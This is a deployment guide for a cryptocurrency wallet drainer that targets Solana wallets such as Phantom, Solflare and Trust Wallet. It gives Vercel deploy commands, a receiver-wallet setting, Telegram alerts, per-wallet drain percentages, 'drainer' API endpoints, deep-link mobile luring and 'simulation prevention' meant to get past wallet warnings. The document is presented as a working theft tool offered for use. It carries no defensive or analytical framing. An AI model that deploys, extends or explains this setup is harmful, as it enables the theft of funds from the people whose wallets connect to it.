# Deployment Guide

## 🚀 Quick Deployment

### Option 1: Vercel CLI (Recommended)
```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
vercel --prod
```

### Option 2: Windows Batch Script
```cmd
deploy.bat
```

### Option 3: Manual Steps
1. Create `.env` file with your configuration
2. Run `npm install`
3. Deploy to Vercel

## 📋 Pre-Deployment Checklist

- [ ] Environment variables configured
- [ ] RPC endpoint set up
- [ ] Receiver wallet address configured
- [ ] Telegram integration (optional)
- [ ] All tests passing

## 🔧 Configuration

### Required Environment Variables
```env
NODE_ENV=production
RPC_URL=https://your-rpc-endpoint.com
RECEIVER_WALLET=your-receiver-wallet-address
```

### Optional Environment Variables
```env
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id
```

## 📊 Features

### Wallet Support
- **Phantom**: 95% drain, 0.0004 SOL reserve
- **Solflare**: 100% drain, 0.00094 SOL reserve
- **Backpack**: 100% drain, 0.00094 SOL reserve
- **Trust Wallet**: 100% drain, 0.00094 SOL reserve
- **Glow**: 100% drain, 0.00094 SOL reserve
- **Exodus**: 100% drain, 0.00094 SOL reserve

### Security Features
- TOCTOU protection
- Transaction fingerprinting
- Simulation prevention
- Input validation

## 🌐 API Endpoints

- `GET /health` - Health check
- `POST /api/drainer` - Main drainer
- `POST /api/wallet-management` - Wallet management
- `POST /api/unified-drainer` - Unified logic

## 📱 Mobile Support

- Deep link integration
- Universal links
- Patient mode for user interaction
- Responsive design

## 🔍 Monitoring

- Real-time Telegram notifications
- Comprehensive logging
- Error tracking
- Performance metrics

## 🛠️ Troubleshooting

### Common Issues
1. **Environment variables not set**: Check `.env` file
2. **RPC errors**: Verify RPC endpoint
3. **Wallet connection issues**: Check deep link configuration
4. **Transaction failures**: Review fee calculation

### Debug Mode
Set `NODE_ENV=development` for detailed logging.

## 📈 Performance

- Optimized for Vercel serverless
- 2GB memory allocation
- 300s timeout for main functions
- Efficient resource usage

## 🔒 Security

- No sensitive data in logs
- Secure environment handling
- Input sanitization
- Rate limiting ready
